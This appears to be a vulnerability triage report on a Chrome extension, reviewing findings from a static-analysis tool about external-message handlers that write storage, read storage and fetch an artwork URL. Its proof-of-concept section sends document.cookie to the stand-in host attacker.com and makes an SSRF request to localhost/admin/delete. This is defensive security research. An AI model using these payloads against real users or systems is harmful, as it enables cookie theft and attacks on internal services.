# CoCo Analysis: bglneidhakmhdnbiggoldnkdgbckdeck

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 6 unique flows (3 storage_set, 2 storage_get->sendResponse, 1 fetch)

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (Line 1403)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bglneidhakmhdnbiggoldnkdgbckdeck/opgen_generated_files/bg.js
Line 1403    setParams[request.key] = !!request.value;
```

**Code:**

```javascript
// Background - External message handler (bg.js line 1021)
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
    if (request.type === 'setSettings') {
        setSettings(request); // ← attacker-controlled request
    }
    // ... other handlers
});

// Function setSettings (bg.js line 1401)
function setSettings(request) {
    var setParams = {};
    setParams[request.key] = !!request.value; // ← Line 1403: attacker controls key and value

    if (request.key === 'globalMediaKeys') {
        // ... handler code
    } else if (request.key === 'musicNotifications') {
        // ... handler code
    } else if (request.key === 'voiceActivation') {
        // ... handler code
    } else if (request.key === 'voiceActivationCommand') {
        var newActivationCommand = parseInt(request.value) || ACTIVATE_SAMI; // ← Line 1435
        // ... validation logic
        setParams[request.key] = newActivationCommand;
    } else if (request.key === 'detectionSensitivity') {
        var newDetectionSensitivity = parseInt(request.value) || 30; // ← Line 1442
        // ... validation logic
        setParams[request.key] = newDetectionSensitivity;
    }

    chrome.storage.local.set(setParams); // ← Storage poisoning sink (Line 1454)
}
```

**Classification:** FALSE POSITIVE

**Reason:** Storage poisoning without retrieval path to attacker. While external messages from `*.gamingtribe.com` can write to storage via `request.key` and `request.value`, the poisoned data is only used internally by the extension for settings management. There is no path for the attacker to retrieve the stored values back - the `getSettings` function (lines 1457-1478) only returns values via `sendResponse` to the caller, but this requires a separate message with `type: 'getSettings'` and only returns specific keys after processing (boolean conversion or parseInt). The attacker cannot exfiltrate arbitrary poisoned storage data.

---

## Sink 2: storage_local_get_source → sendResponseExternal_sink (Lines 1463, 1467)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bglneidhakmhdnbiggoldnkdgbckdeck/opgen_generated_files/bg.js
Line 1463    resolve(!!result[key]);
Line 1467    resolve(parseInt(result[key]));
```

**Code:**

```javascript
// Background - External message handler (bg.js line 1021)
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
    if (request.type === 'getSettings') {
        return getSettings(request, sendResponse); // ← attacker triggers read
    }
});

// Function getSettings (bg.js line 1457)
function getSettings(request, sendResponse) {
    var key = typeof request === 'string' ? request : request.key;

    var promise = new Promise(function(resolve) {
        if (key === 'globalMediaKeys' || key === 'musicNotifications' ||
            key === 'voiceActivation' || key === 'audioGranted' || key === 'autoSpeak') {
            chrome.storage.local.get(key, function(result) {
                resolve(!!result[key]); // ← Line 1463: boolean conversion, sends back to attacker
            });
        } else if (key === 'voiceActivationCommand' || key === 'detectionSensitivity') {
            chrome.storage.local.get(key, function(result) {
                resolve(parseInt(result[key])); // ← Line 1467: parseInt, sends back to attacker
            });
        }
    });

    if (typeof sendResponse === 'function') {
        promise.then(sendResponse); // ← Sends storage data back to attacker
        return true;
    }
}
```

**Classification:** FALSE POSITIVE

**Reason:** While this is a complete storage exploitation chain (attacker can read storage via sendResponse), the retrieved data is NOT sensitive. The storage only contains extension settings (boolean flags for media keys, notifications, voice activation, etc.). These are user preferences, not sensitive data like cookies, history, or authentication tokens. Reading user's extension settings does not constitute a meaningful security vulnerability under the threat model.

---

## Sink 3: bg_chrome_runtime_MessageExternal → fetch_resource_sink (Line 1053)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bglneidhakmhdnbiggoldnkdgbckdeck/opgen_generated_files/bg.js
Line 1047    if (typeof request.track.artist !== 'undefined') {
Line 1053    getImageBlob(request.track.artwork_url)
```

**Code:**

```javascript
// Background - External message handler (bg.js line 1021)
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
    if (request.type === 'music') {
        if (request.change === 'track') {
            // ... notification setup code

            var trackTitle;
            if (typeof request.track.artist !== 'undefined') { // ← Line 1047
                trackTitle = request.track.artist + ' – ' + request.track.title;
            } else {
                trackTitle = request.track.title;
            }

            getImageBlob(request.track.artwork_url) // ← Line 1053: attacker controls URL
                .then(function(blobUrl) {
                    showTrackNotification(trackTitle, blobUrl);
                });

            return true;
        }
    }
});

// Function getImageBlob (bg.js line 2054)
function getImageBlob(imageUrl) {
    if (imageUrl) {
        return fetch(imageUrl) // ← SSRF: fetch to attacker-controlled URL
            .then(function(response) {
                return response.blob();
            })
            .then(function(blob) {
                return URL.createObjectURL(blob);
            })
            .catch(function() {
                return;
            })
    } else {
        return Promise.resolve();
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From a webpage on *.gamingtribe.com domain:
chrome.runtime.sendMessage(
    'bglneidhakmhdnbiggoldnkdgbckdeck', // Extension ID
    {
        type: 'music',
        change: 'track',
        track: {
            artist: 'Attacker',
            title: 'Malicious',
            artwork_url: 'http://attacker.com/exfiltrate?cookie=' + document.cookie
        }
    }
);

// OR SSRF to internal network:
chrome.runtime.sendMessage(
    'bglneidhakmhdnbiggoldnkdgbckdeck',
    {
        type: 'music',
        change: 'track',
        track: {
            artist: 'Test',
            title: 'Test',
            artwork_url: 'http://localhost:8080/admin/delete'
        }
    }
);
```

**Impact:** External attacker from `*.gamingtribe.com` domain can trigger privileged cross-origin fetch requests to arbitrary URLs via the extension's background context. This enables SSRF attacks to internal network resources or exfiltration of data via URL parameters. The extension has no validation on the `artwork_url` field, allowing complete attacker control over the fetch destination.
